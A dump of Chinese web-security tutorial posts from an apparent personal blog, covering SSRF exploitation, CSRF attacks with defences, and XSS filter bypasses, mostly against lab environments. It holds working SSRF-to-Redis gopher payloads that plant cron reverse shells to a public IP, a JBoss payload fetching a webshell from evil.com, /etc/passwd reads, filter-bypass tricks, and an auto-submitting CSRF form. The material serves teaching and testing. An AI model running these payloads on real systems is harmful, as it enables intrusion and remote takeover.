2、远程利用（1）环境攻击机ip：192.168.201.129、121.36.67.230攻击机：Kali、公网服务器远程服务器ip：39.x.x.xdocker镜像：ssrf_redisPHP版本：PHP Version 7.2.28(5.6版本测试会失败) &emsp;&emsp;关闭了防跨站攻击 （2）远程利用示例代码&emsp;&emsp;ssrf.php &lt;?php$ch = curl_init(); //创建新的 cURL 资源curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]); //设置URL 和相应的选项#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件curl_close($ch); //关闭 cURL 资源，并且释放系统资源?&gt; &emsp;&emsp;post.php &lt;html&gt;&lt;head&gt; &lt;title&gt;post&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php echo $_REQUEST[cmd]; ?&gt;&lt;/body&gt;&lt;/html&gt; （3）远程利用方式a、利用file协议&emsp;&emsp;任意文件读取 curl -v &#x27;http://ssrf.xxx.com/ssrf.php?url=file:///etc/passwd&#x27; b、利用dict协议（1）查看端口及端口上运行服务的版本信息 curl -v &#x27;http://ssrf.xxx.com/ssrf.php?url=dict://127.0.0.1:22/&#x27; &emsp;&emsp;说明22端口开放 （2）通过dict协议GetShell&emsp;&emsp;有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上\\r\\n(CRLF)。 &emsp;&emsp;dict协议要一条一条的执行，而Gopher协议执行一条命令就行了。 c、利用Gopher协议（1）攻击内网Redis并反弹shell&emsp;&emsp;利用Redis未授权访问攻击Redis &emsp;&emsp;攻击Redis的exp echo -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quitbash shell.sh 39.x.x.x 6379 &emsp;&emsp;从而捕获到数据，并进行转换，转换规则如下： 如果第一个字符是&gt;或者&lt;那么丢弃该行字符串，表示请求和返回的时间。如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。将\\r字符串替换成%0d%0a空白行替换为%0a &emsp;&emsp;结合Gopher协议攻击内网Redis，使用上边捕获数据的转换结果即可，然后进行反弹Shell： curl -v &#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#x27; &emsp;&emsp;反弹成功 http://39.x.x.x:8000/ssrf.php是存在SSRF漏洞的Web服务192.168.1.4是redis应用所在内网ip121.36.67.230是公网服务器，接收反弹shell （2）伪造POST请求反弹Shellcurl -v &#x27;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#x27; &emsp;&emsp;反弹成功 192.168.1.5是内网Web服务，有post.php d、利用http/s协议（1）探测内网主机存活 &emsp;&emsp;说明内网ip为192.168.1.3的主机存活 （2）端口扫描http://example.com/ssrf.php?url=http://192.168.0.108:21/http://example.com/ssrf.php?url=http://192.168.0.108:22/http://example.com/ssrf.php?url=http://192.168.0.108:80/http://example.com/ssrf.php?url=http://192.168.0.108:443/http://example.com/ssrf.php?url=http://192.168.0.108:3306/ &emsp;&emsp;可通过应用响应时间、返回的错误信息，返回的服务Banner来判断端口是否开放，如图所示 &emsp;&emsp;上面两张图中，左侧为访问22端口并从错误信息中返回Banner，右侧为访问21端口被拒绝（未开放）。当PHP未开启显错模式时，可通过响应时间来判断端口是否开放。本人实验结果是开放端口响应更快。 （3）对内网Web应用进行指纹识别及攻击其中存在漏洞的应用&emsp;&emsp;大多数Web应用都有一些独特的文件和目录，通过这些文件可以识别出应用的类型，甚至详细的版本。基于此特点可利用SSRF漏洞对内网Web应用进行指纹识别，如下Payload可以识别主机是否安装了WordPress http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A443%2Fwp-content%2Fthemes%2Fdefault%2Faudio.jpghttp://example.com/ssrf.php?url=https://127.0.0.1:443/wp-content/themes/default/audio.jpg &emsp;&emsp;得到应用指纹后，便能有针对性地对其存在的漏洞进行利用。如下Payload展示了如何利用SSRF漏洞攻击内网的JBoss应用： http://example.com/ssrf.php?url=https%3A%2F%2F127.0.0.1%3A8080%2Fjmx-console%2FHtmlAdaptor%3Faction%3DinvokeOp%26name%3Djboss.system%253Aservice%253DMainDeployer%26methodIndex%3D3%26arg0%3Dhttp%253A%252F%252Fevil.com%252Fwebshell.warhttp://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system%3Aservice%3DMainDeployer&amp;methodIndex=3&amp;arg0=http%3A%2F%2Fevil.com%2Fwebshell.warhttp://example.com/ssrf.php?url=https://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=3&amp;arg0=http://evil.com/webshell.war e、命令执行&emsp;&emsp;PHP环境下如果安装了expect扩展，还可以通过expect协议执行系统命令，如： http://example.com/ssrf.php?url=expect://id 七、防护绕过1、常见防护方式很多开发者使用正则表达式端方式对SSRF中的请求地址进行过滤，具体表现如下： 限制请求特定域名 禁止请求内网IP 然而，这两种过滤都很容易被绕过，可用的方法具体如下： 2、防护绕过（1）使用@&emsp;&emsp;使用 http://example.com@eval.com 这种格式来绕过正则 &emsp;&emsp;在对@解析域名中，不同的处理函数存在处理差异，如：http://www.aaa.com@www.bbb.com@www.ccc.com在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com （2）另类IP地址写法&emsp;&emsp;IP地址转为进制（八进制、十进制、十六进制）及IP地址省略写法，举例说明如下 [+] 0177.000.00.01 八进制[+] 2130706433 十进制[+] 0x7f.0x0.0x0.0x1 十六进制[+] 127.1 IP地址省略写法以上4种写法均可表示127.0.0.1 （3）配置域名&emsp;&emsp;如果我们手中有可控域名，则可根据那个域名A记录指向欲请求的IP进行绕过操作： evil.example.com =&gt; 10.0.18.3 &emsp;&emsp;或者利用DNS解析为指定的域名，evil.example.com可以指向任意域名 evil.example.com =&gt; heihei.com （4）利用[::]绕过localhost&emsp;&emsp;可以利用[::]来绕过localhost http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 （5）添加端口号http://127.0.0.1:8080 （6）利用短网址 站长工具短网址 百度短网址 （7）句号127。0。0。1 &gt;&gt;&gt; 127.0.0.1 （8）302跳转&emsp;&emsp;使用https://tinyurl.com生成302跳转地址 3、常见绕过形式（1）限制为http://www.xxx.com 域名&emsp;&emsp;采用http基本身份认证的方式绕过。即@ http://www.xxx.com@www.xxc.com （2）限制请求IP不为内网地址当不允许ip为内网地址时 采取短网址绕过 采取特殊域名 采取进制转换 （3）限制请求只为HTTP协议 采取302跳转 采取短地址 八、实战1、weblogic ssrf攻击redisCVE-2014-4210 下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 编译并启动环境 docker-compose builddocker-compose up -d 访问http://your-ip:7001/uddiexplorer/，无需登录即可查看uddiexplorer应用。 SSRF漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp （1）查看端口http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001`，访问一个可以访问的`IP:PORT`，如`http://127.0.0.1:7001`， 访问的端口将会得到错误，一般是返回`status code`（如下图），如果访问的非http协议，则会返回`did not have a valid SOAP content-type 修改为一个不存在的端口，将会返回could not connect over HTTP to server 通过错误的不同，即可探测内网状态。 （2）注入HTTP头，利用Redis反弹shell&emsp;&emsp;Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 &emsp;&emsp;首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通： 发送三条Redis命令，将反弹shell脚本写入/etc/crontab定时任务： set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;sh -i &gt;&amp; /dev/tcp/1.15.35.104/4444 0&gt;&amp;1&#x27;\\n\\n\\n\\n&quot;config set dir /etc/config set dbfilename crontabsave 进行url编码： set%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave 注意，换行符是 \\r\\n ，也就是 %0D%0A 。 将url编码后的字符串放在ssrf的域名后面，发送： http://192.168.0.108:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.18.0.2:6379/test/%0d%0a%0d%0aset%201%20%22%5cn%5cn%5cn%5cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#x27;sh%20-i%20%3e%26%20%2fdev%2ftcp%2fevil%2f21%200%3e%261&#x27;%5cn%5cn%5cn%5cn%22%0aconfig%20set%20dir%20%2fetc%2f%0aconfig%20set%20dbfilename%20crontab%0asave","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SSRF","slug":"SSRF","permalink":"https://wolke.cn/tags/SSRF/"}],"author":"w01ke"},{"title":"CSRF跨站请求伪造攻击","slug":"CSRF跨站请求伪造攻击","date":"2022-01-31T08:27:30.000Z","updated":"2022-02-02T15:45:12.769Z","comments":true,"path":"post/ecd34c17.html","link":"","permalink":"https://wolke.cn/post/ecd34c17.html","excerpt":"","text":"一、CSRF介绍&emsp;&emsp;CSRF全称为跨站请求伪造（Cross-site request forgery），是一种网络攻击方式，也被称为 one-click attack 或者 session riding。通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像xss漏洞，但是它与xss漏洞非常不同。xss利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与xss攻击相比，csrf攻击往往不大流行，也难以防范，所以认为比xss漏洞更具危险性 二、CSRF漏洞原理&emsp;&emsp;CSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。CSRF漏洞能够做的事情包括：以目标用户的名义发送邮件、发消息、盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威胁到了目标用户的财产安全 Csrf漏洞的攻击过程有两个重点： 目标用户已经登录了网站，能够执行网站的功能 目标用户访问了攻击者构造的URL 三、CSRF攻击实例1、角色 正常浏览网页的用户：User 正规的但是具有漏洞的网站：WebA 利用CSRF进行攻击的网站：WebB 2、流程（1）步骤一&emsp;&emsp;用户登录、浏览并信任正规网站WebA，同时，WebA通过用户的验证并在用户的浏览器中产生Cookie。 （2）步骤二&emsp;&emsp;攻击者WebB通过在WebA中添加图片链接等方式诱导用户User访问网站WebB。 （3）步骤三&emsp;&emsp;在用户User被诱导访问WebB后，WebB会利用用户User的浏览器访问第三方网站WebA，并发出操作请求。 （4）步骤四&emsp;&emsp;用户User的浏览器根据WebB的要求，带着步骤一中产生的Cookie访问WebA。 （5）步骤五&emsp;&emsp;网站WebA接收到用户浏览器的请求，WebA无法分辨请求由何处发出，由于浏览器访问时带上用户的Cookie，因此WebA会响应浏览器的请求，如此一来，攻击网站WebB就达到了模拟用户操作的目的。 四、CSRF攻击防护&emsp;&emsp;上文简单的叙述了CSRF攻击的原理，接下来将要介绍几种CSRF攻击的防护方法。 （1）验证用户&emsp;&emsp;当用户发送重要的请求时需要输入原始密码或验证码 （2）限制请求方式&emsp;&emsp;限制请求方式只能为POST （3）只使用JSON API&emsp;&emsp;使用JavaScript发起AJAX请求是限制跨域的，并不能通过简单的表单来发送JSON，所以，通过只接收JSON可以很大可能避免CSRF攻击。 （4）验证HTTP Referer字段（同源策略）&emsp;&emsp;根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如上文中用户User想要在网站WebA中进行转账操作，那么用户User必须先登录WebA，然后再通过点击页面上的按钮出发转账事件，这时该转帐请求的 Referer值就会是转账按钮所在的页面的URL，而如果黑客要对银行网站实施 CSRF攻击，他只能在他自己的网站构造请求，当用户User通过黑客的网站发送请求到WebA时，该请求的 Referer是指向黑客自己的网站。 &emsp;&emsp;因此，要防御 CSRF 攻击，网站WebA只需要对于每一个转账请求验证其 Referer值，如果是以网站WebA的网址开头的域名，则说明该请求是来自WebA自己的请求，是合法的。如果 Referer是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。 （5）在请求地址中添加token验证&emsp;&emsp;CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie来通过安全验证。要抵御CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token或者 token内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 &emsp;&emsp;这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于session之中，然后在每次请求时把token从session中拿出，与请求中的token进行比对。 &emsp;&emsp;token可看作是数据包的编号，每次产生一个新的请求数据包时，就会有一个新的token，与session中的token比对不成功，即抵御了CSRF攻击 五、Pikachu靶场CSRF练习1、CSRF（GET）&emsp;&emsp;首先从提示可以使用用户名和密码登录，然后在用户修改个人信息的时候，坏人通过一些方式（ARP欺骗劫持、中间人监听、流量嗅探）抓取到了包 &emsp;&emsp;得到一个修改电话号码URL：127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=123456789&amp;add=&amp;email=&amp;submit=submit，复制好保留，把包放掉，现在手机号是123456789 &emsp;&emsp;假如想让手机号改为666666，做一个html，其中一条关键语句&lt;a href=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=666666&amp;add=&amp;email=&amp;submit=submit&quot;&gt;点我抽奖！&lt;/a&gt;，将做好的html发给当事人，当事人点击了链接，即可成功修改电话号码（如果是正经的话得把html放到公网上） 2、CSRF（POST）&emsp;&emsp;小白修改信息，点击提交，被黑客抓到了包，记录好 &emsp;&emsp;此时写一个POST传参的html页面，发送给小白，小白点击一闪而过就会被修改信息了（或者用BurpSuite也可以一键生成“engagement tools”-&gt;“generate CSRF poc”） &lt;html&gt; &lt;head&gt; &lt;script&gt; window.onload = function()&#123; document.getElementById(&quot;postsubmit&quot;).click(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_p ost_edit.php&quot;&gt; &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt; &lt;input id=&quot;phonenum&quot; type=&quot;text&quot; name=&quot;phonenum&quot; value=&quot;666666&quot; /&gt; &lt;input id=&quot;add&quot; type=&quot;text&quot; name=&quot;add&quot; value=&quot;china&quot; /&gt; &lt;input id=&quot;email&quot; type=&quot;text&quot; name=&quot;email&quot; value=&quot;vince@pikachu.com&quot; /&gt; &lt;input id=&quot;sex&quot; type=&quot;text&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt; &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 3、CSRF Token&emsp;&emsp;由于token值每次提交后都会失效，恶意攻击者抓到小白的GET请求时里面的token已经失效了，所以网站也就没有执行GET请求的操作，CSRF也就防御成功 六、CSRF自动化测试—CSRFTester1、CSRFTester简介&emsp;&emsp;CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果测试的请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 2、CSRFTester环境准备 Windows系统 Java环境配置 CSRFTester 点击下载 提取码：kytb espcms：一个存在CSRF的CMS 点击下载 提取码：upg1 3、CSRFTester使用&emsp;&emsp;安装espcms &emsp;&emsp;设置浏览器代理：127.0.0.1:8008 &emsp;&emsp;提交表单前，先开启CSRFTester监听 &emsp;&emsp;登录espcms后台，添加一个名为w01ke的会员，提交表单 &emsp;&emsp;在CSRFTester里找到提交的表单数据包，将其原来数据修改为admin2数据，然后点击右下角Generate HTML保存到指定目录，会生成一个index.html文件 &emsp;&emsp;打开index.html将末尾form里面的代码全删除掉 &emsp;&emsp;修改完后，使用同个浏览器打开index.html，页面返回true &emsp;&emsp;再返回查看会员列表页面，可以发现已经成功添加了admin2用户 【小贴士】使用CSRFTester工具做测试时，为提供效率，最好只打开要测试的网站页面，也就是在工具中截获的页面尽可能少，否则可能测试结果不准确。 七、参考链接 https://blog.csdn.net/diubrother/article/details/88366932?spm=1001.2014.3001.5501 http://luckyzmj.cn/posts/a1b686d3.html#","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"CSRF","slug":"CSRF","permalink":"https://wolke.cn/tags/CSRF/"}],"author":"w01ke"},{"title":"XSS的Waf绕过及工具使用","slug":"XSS的Waf绕过及工具使用","date":"2022-01-30T15:04:53.000Z","updated":"2022-02-01T11:48:03.143Z","comments":true,"path":"post/c970015a.html","link":"","permalink":"https://wolke.cn/post/c970015a.html","excerpt":"","text":"一、常用payload1、echo&lt;?phpecho &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;?&gt; 2、img标签&lt;img src=javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr=&quot;URL&quot; style=&#x27;Xss:expression(alert(xss));&#x27;&gt;&lt;img src=&quot;x&quot; onerror=alert(1)&gt;&lt;img src=&quot;x&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;&lt;img src=x onmouseover=alert(&#x27;xss&#x27;)&gt; 3、CSS&lt;img STYLE=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt; 4、href标准格式&lt;a href=&quot;https://www.baidu.com&quot;&gt;baidu&lt;/a&gt;XSS利用方式1&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;)&quot;&gt;aa&lt;/a&gt; &lt;a href=javascript:eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt; &lt;a href=&quot;javascript:aaa&quot; onmouseover=&quot;alert(/xss/)&quot;&gt;aa&lt;/a&gt; XSS利用方式2&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; &lt;a href=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;aa&lt;/a&gt;XSS利用方式3&lt;a href=&quot;&quot; onclick=eval(alert(&#x27;xss&#x27;))&gt;aa&lt;/a&gt;XSS利用方式4&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(&#x27;xss&#x27;) y=2016&gt;aa&lt;/a&gt; 5、form标签XSS利用方式1&lt;form action=javascript:alert(&#x27;xss&#x27;) method=&quot;get&quot;&gt;&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;XSS利用方式2&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;&lt;form action=1 onmouseover=alert(&#x27;xss&#x27;)&gt; 6、input标签标准格式&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;利用方式1&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;利用方式2&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;利用方式4&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; 7、iframe标签XSS利用方式1&lt;iframe src=javascript:alert(&#x27;xss&#x27;);height=5width=1000 /&gt;&lt;iframe&gt;XSS利用方式2&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;&lt;!--原code--&gt; &lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt; &lt;!--base64编码--&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;XSS利用方式3&lt;iframe src=&quot;aaa&quot; οnmοuseοver=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;XSS利用方式3&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;&quot;&gt;&lt;/iframe&gt; 8、svg标签&lt;svg onload=alert(1)&gt; 9、其他 事件型还有onbody标签 二、常用的绕过Waf1、利用大小写绕过&emsp;&emsp;这个绕过方式的出现是因为网站仅仅只过滤了&lt;script&gt;标签，而没有考虑标签中的大小写并不影响浏览器的解释所致。具体的方式就像这样： &lt;sCriPt&gt;alert(1)&lt;/SCripT&gt; 2、利用过滤后返回语句再次构成攻击语句来绕过（经常用双写绕过）&emsp;&emsp;有的只过滤了一次script标签，因此可以使用双写来绕过&lt;sCri&lt;script&gt;Pt&gt;alert(1)&lt;/SC&lt;/script&gt;ripT&gt; 3、并不是只有script标签才可以插入代码（1）img标签&emsp;&emsp;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;就可以再次愉快的弹窗。原因很简单，我们指定的图片地址根本不存在也就是一定会发生错误，这时候onerror里面的代码自然就得到了执行。 （2）onmouseover事件 onmouseover=&quot;alert(1)&quot;，比如 &lt;a onmousemove=&quot;do something here&quot;&gt; 当用户鼠标移动时即可运行代码 &lt;div onmouseover=&quot;do something here&quot;&gt; 当用户鼠标在这个块上面时即可运行（可以配合weight等参数将div覆盖页面，鼠标不划过都不行） （3）onclick事件&emsp;&emsp;onclick=&quot;alert(1)&quot; 这个要点击后才能运行代码，条件相对苛刻，就不再详述。 （4）onload事件&emsp;&emsp;比如以下代码 function render (input) &#123; let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ //http...或https.... if (domainRe.test(input)) &#123; //是否包含在input中 return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;` &#125; return &#x27;Invalid URL&#x27;&#125; &emsp;&emsp;payload：http://www.segmentfault.com&quot; onload=&quot;alert(1) 4、编码脚本绕过关键字过滤（1）Javascript的编码–eval()函数&emsp;&emsp;\\uXXXX 这种写法的Unicode 转义序列，表示一个字符，其中 XXXX 表示一个 16 进制数字，如&lt;的Unicode 编码为\\u003c。 &emsp;&emsp;有的时候，服务器往往会对代码中的关键字（如alert）进行过滤，这个时候我们可以尝试将关键字进行编码后再插入，不过直接显示编码是不能被浏览器执行的，我们可以用另一个语句eval()来实现。eval()会将编码过的语句解码后再执行，简直太贴心了。 &emsp;&emsp;例如alert(1)编码过后就是\\u0061\\u006c\\u0065\\u0072\\u0074(1)（对应于ASCII码的十六进制） &emsp;&emsp;所以构建出来的攻击语句如下：&lt;script&gt;eval(\\u0061\\u006c\\u0065\\u0072\\u0074(1))&lt;/script&gt; （2）HTML实体编码&emsp;&emsp;实体编码字符&lt;svg&gt;（翻译官） &emsp;&emsp;把要转码的先Unicode转换一下，然后后台看到有翻译官会把Unincode编码转回为当初的字符 &emsp;&emsp;比如以下代码 function render (input) &#123; const stripBracketsRe = /[()`]/g //正则表达式，看//包裹的内容即可 input = input.replace(stripBracketsRe, &#x27;&#x27;) 把()`替换为空 return input&#125; &emsp;&emsp;payload：&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt; 因为控制字符()变成了实体编码因此要使用翻译官才能让()正确发挥控制字符的作用 （3）翻译官（Unicode编码）function render (input) &#123; input = input.toUpperCase() //把所有的输出内容都大写 return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; &emsp;&emsp;payload：&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt; 👈HTML编码或者&lt;svg&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;👈Unicode编码 5、主动闭合标签实现注入代码&emsp;&emsp;比如以下代码 function render (input) &#123; return &#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27; + input + &#x27;&quot;&gt;&#x27;&#125; &emsp;&emsp;payload：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input type=&#39;name&#39; value=&quot; 或者 &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 6、绕过小括号()&emsp;&emsp;在前端中，反引号```可以当作小括号来使用 &emsp;&emsp;比如以下代码 function render (input) &#123; const stripBracketsRe = /[()]/g //正则表达式，看//中间的内容即可 input = input.replace(stripBracketsRe, &#x27;&#x27;) //把[()]替换为空 return input&#125; &emsp;&emsp;payload：&lt;script&gt;alert1&lt;/script&gt; 7、绕过()`(1)使用HTML实体编码如上文所述 8、绕过HTML注释符 有两种注释方法： &lt;!-- 注释内容 --&gt; ``&lt;!– 注释内容 –!&gt;` 比如以下代码 function render (input) &#123; input = input.replace(/--&gt;/g, &#x27;😂&#x27;) //将--&gt;替换为笑脸 return &#x27;&lt;!-- &#x27; + input + &#x27; --&gt;&#x27;&#125; payload：--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--，使用另一个注释符来畸形进行绕过 9、利用换行符绕过&emsp;&emsp;%0a–换行符 &emsp;&emsp;比如以下代码 function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;) //auto或on开头，后面跟任意东西，直到出现=或者&gt;都转化成_ return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`&#125; &emsp;&emsp;payload： onmouseover=&quot;alert(1)&quot; 在前端的世界里，换行一样有用，因此这里通过换行来避免on碰到= 10、绕过右标签function render (input) &#123; const stripTagsRe = /&lt;\\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &#x27;&#x27;) //所有标签类的，只让写左标签，右标签一加，就替换为空 return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; &emsp;&emsp;匹配&lt;/ 任意字符&gt;，而且/i过滤了大小写，但html的单标签也可以解析 &emsp;&emsp;payload：&lt;img src=x onerror=&quot;alert(1)&quot; 11、绕过&lt;/内容&gt;function render (src) &#123; src = src.replace(/&lt;\\/style&gt;/ig, &#x27;/* \\u574F\\u4EBA */&#x27;) //碰到&lt;/style&gt;就替换成/*坏人*/ return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; （1）使用换行&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt; （2）使用空格&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt; 12、引用指定网站下的目录文件function render (input) &#123; input = input.toUpperCase() //把所有的输出内容都大写 return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; &emsp;&emsp;js标签，src的地址，随便，但是js的语法是大小写敏感的 &emsp;&emsp;开启phpstudy，在目录下创建一个ABC.JS，写上一条alert(1);语句，保存 &emsp;&emsp;payload：&lt;script src=&quot;http://127.0.0.1/ABC.JS&quot;&gt;&lt;/script&gt; 13、使用JS的注释符（1）注释符–&gt;&emsp;&emsp;--&gt; js的注释符，让后面的语句不生效 function render (input) &#123; input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) //过滤了&lt; 